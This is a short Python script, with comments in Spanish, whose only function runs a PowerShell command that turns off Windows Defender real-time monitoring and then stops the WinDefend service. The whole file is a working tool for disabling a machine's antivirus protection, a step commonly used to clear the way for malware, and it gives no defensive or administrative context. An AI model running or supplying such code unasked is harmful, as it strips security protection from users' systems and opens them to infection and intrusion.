import os
import subprocess

def desactivar_windows_defender():
    # Desactivar la protección en tiempo real de Windows Defender
    os.system('powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true')
    
    # Detener el servicio de Windows Defender
    subprocess.run(['sc', 'stop', 'WinDefend'], check=True)

if __name__ == '__main__':
    desactivar_windows_defender()